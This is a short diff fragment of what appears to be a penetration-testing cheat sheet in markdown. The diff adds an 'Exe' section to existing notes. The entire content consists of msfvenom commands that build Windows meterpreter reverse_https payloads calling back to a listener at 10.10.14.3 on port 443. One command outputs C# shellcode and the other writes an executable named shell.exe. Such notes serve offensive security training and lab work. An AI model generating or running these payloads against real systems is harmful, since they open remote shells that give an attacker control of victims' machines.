@@ -15,3 +15,9 @@ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=44
 ```bash
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f csharp
 ```
+
+### Exe
+
+```bash
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f exe > shell.exe
+```
